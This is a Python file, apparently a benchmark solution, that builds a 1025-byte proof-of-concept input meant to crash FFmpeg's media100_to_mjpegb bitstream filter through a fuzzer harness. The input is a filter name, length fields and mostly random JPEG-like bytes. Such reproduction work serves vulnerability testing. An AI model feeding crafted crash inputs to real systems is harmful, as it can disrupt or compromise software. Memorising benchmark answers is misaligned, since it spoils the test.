import os
import tarfile
import io
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Best-effort PoC for FFmpeg bsf: media100_to_mjpegb.
        # Many FFmpeg fuzzers expect the BSF name as a C-string at the start,
        # followed by length-prefixed packets. We'll construct such a buffer.
        #
        # Structure used here (heuristic, aims to be compatible with common FFmpeg bsf fuzzers):
        # - bsf name as null-terminated string: "media100_to_mjpegb\0"
        # - 4 bytes LE: extradata size (0)
        # - 4 bytes LE: number of packets (1)
        # - 4 bytes LE: first packet size (remaining bytes)
        # - packet data: random-looking data to engage decoder paths
        #
        # Ensure total length is 1025 bytes to match ground-truth PoC length.
        name = b"media100_to_mjpegb\x00"
        header = io.BytesIO()
        header.write(name)
        header.write((0).to_bytes(4, "little"))  # extradata size
        header.write((1).to_bytes(4, "little"))  # number of packets (1)
        base = header.getvalue()

        total_len = 1025
        # reserve 4 bytes for the length of the single packet
        remaining_for_packet = total_len - (len(base) + 4)
        if remaining_for_packet < 0:
            # Fallback: if header unexpectedly larger, just return 1025 bytes with the name at start
            out = bytearray(total_len)
            out[:min(len(name), total_len)] = name[:min(len(name), total_len)]
            return bytes(out)

        pkt_len = remaining_for_packet
        pkt_len_bytes = pkt_len.to_bytes(4, "little")

        # Create packet content: start with a plausible MJPEG start marker then fill with noise
        # SOI marker 0xFFD8, followed by APP0 JFIF 0xFFE0 to encourage JPEG parser paths.
        pkt = bytearray()
        if pkt_len >= 4:
            pkt += b"\xFF\xD8\xFF\xE0"
        while len(pkt) < pkt_len:
            # Mix of 0xFF fill and random bytes to produce varied bit patterns
            chunk_size = min(64, pkt_len - len(pkt))
            if random.random() < 0.3:
                pkt += b"\xFF" * chunk_size
            else:
                pkt += os.urandom(chunk_size)

        out = base + pkt_len_bytes + bytes(pkt)
        # Ensure exact length
        if len(out) < total_len:
            out += b"\x00" * (total_len - len(out))
        elif len(out) > total_len:
            out = out[:total_len]
        return out